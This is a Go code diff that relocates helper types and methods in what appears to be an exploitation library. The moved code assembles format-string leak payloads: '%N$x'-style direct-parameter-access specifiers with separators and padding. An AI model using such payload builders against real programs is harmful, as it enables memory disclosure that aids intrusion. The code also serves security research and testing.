@@ -44,33 +44,6 @@ func SetupFormatStringLeakViaDPAOrExit(config FormatStringDPAConfig) *FormatStri
 	return f
 }
 
-type dpaFormatString struct {
-	info        formatStringInfo
-	paramNumber int
-}
-
-type formatStringInfo struct {
-	leakedDataSep    []byte
-	specifierChar    byte
-	endOfStringDelim []byte
-}
-
-func (o dpaFormatString) paddedTo(finalStrLen int) []byte {
-	return prependStringWithCharUntilLen(o.withoutPadding(), 'A', finalStrLen)
-}
-
-func (o dpaFormatString) withoutPadding() []byte {
-	buff := bytes.NewBuffer(nil)
-	buff.Write(o.info.leakedDataSep)
-	buff.WriteString("%")
-	buff.WriteString(strconv.Itoa(o.paramNumber))
-	buff.WriteString("$")
-	buff.WriteByte(o.info.specifierChar)
-	buff.Write(o.info.leakedDataSep)
-	buff.Write(o.info.endOfStringDelim)
-	return buff.Bytes()
-}
-
 func SetupFormatStringLeakViaDPA(config FormatStringDPAConfig) (*FormatStringLeaker, error) {
 	formatString, err := createDPAFormatStringLeakWithLastValueAsArg(config)
 	if err != nil {
@@ -152,6 +125,33 @@ func createDPAFormatStringLeakWithLastValueAsArg(config FormatStringDPAConfig) (
 	}
 
 	return nil, fmt.Errorf("failed to find leak oracle after %d writes", i)
+}
+
+type dpaFormatString struct {
+	info        formatStringInfo
+	paramNumber int
+}
+
+type formatStringInfo struct {
+	leakedDataSep    []byte
+	specifierChar    byte
+	endOfStringDelim []byte
+}
+
+func (o dpaFormatString) paddedTo(finalStrLen int) []byte {
+	return prependStringWithCharUntilLen(o.withoutPadding(), 'A', finalStrLen)
+}
+
+func (o dpaFormatString) withoutPadding() []byte {
+	buff := bytes.NewBuffer(nil)
+	buff.Write(o.info.leakedDataSep)
+	buff.WriteString("%")
+	buff.WriteString(strconv.Itoa(o.paramNumber))
+	buff.WriteString("$")
+	buff.WriteByte(o.info.specifierChar)
+	buff.Write(o.info.leakedDataSep)
+	buff.Write(o.info.endOfStringDelim)
+	return buff.Bytes()
 }
 
 type FormatStringLeaker struct {
